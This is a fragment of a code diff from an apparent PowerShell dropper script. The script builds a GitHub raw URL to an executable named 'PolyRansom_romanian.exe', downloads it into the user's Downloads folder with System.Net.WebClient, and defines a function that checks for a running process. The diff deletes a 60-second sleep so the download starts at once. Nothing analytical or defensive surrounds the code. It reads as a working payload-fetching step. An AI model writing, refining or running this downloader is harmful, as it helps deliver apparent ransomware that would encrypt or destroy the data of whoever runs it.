@@ -22,8 +22,6 @@ $url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/PolyRansom_
 $downloadPath = Join-Path $env:USERPROFILE "Downloads\PolyRansom_romanian.exe"
 $webClient = New-Object System.Net.WebClient
 
-Start-Sleep -Seconds 60
-
 $webClient.DownloadFile($url, $downloadPath)
 
 function IsProcessRunning {
